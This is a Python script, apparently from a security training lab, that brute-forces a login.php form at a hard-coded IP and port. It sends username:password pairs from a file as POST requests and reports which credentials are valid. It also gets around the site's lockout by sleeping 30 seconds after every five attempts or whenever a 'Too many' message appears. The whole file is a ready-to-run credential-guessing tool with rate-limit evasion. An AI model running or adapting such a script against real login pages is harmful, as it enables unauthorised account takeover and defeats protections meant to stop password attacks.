import requests
import time

# file that contain user:pass
userpass_file = "valid_passwords.txt"

# create url using user and password as argument
url = "http://83.136.254.223:57399/login.php"

# rate limit blocks for 30 seconds
lock_time = 30

# define limit after which we get hit with too many attempts message
attempts_limit = 5

# message that alert us we hit rate limit
lock_message = "Too many"

# define number of attempts
number_of_attempts = 0

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:

        # if we have reached limit of attempts at a time, wait on own
        if (number_of_attempts != 0) and (number_of_attempts % 5 == 0):
            print("[-] Hit rate limit, sleeping 30")
            time.sleep(lock_time+0.5)

        # skip comment
        if fline.startswith("#"):
            continue

        # take username
        username = fline.split(":")[0]

        # take password, join to keep password that contain a :
        password = ":".join(fline.split(":")[1:]).replace('\n', '')

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": "submit"
        }

        # do the request
        res = requests.post(url, data=data)
        # print(res.text)

        number_of_attempts += 1

        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        elif "Welcome back" in res.text:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)
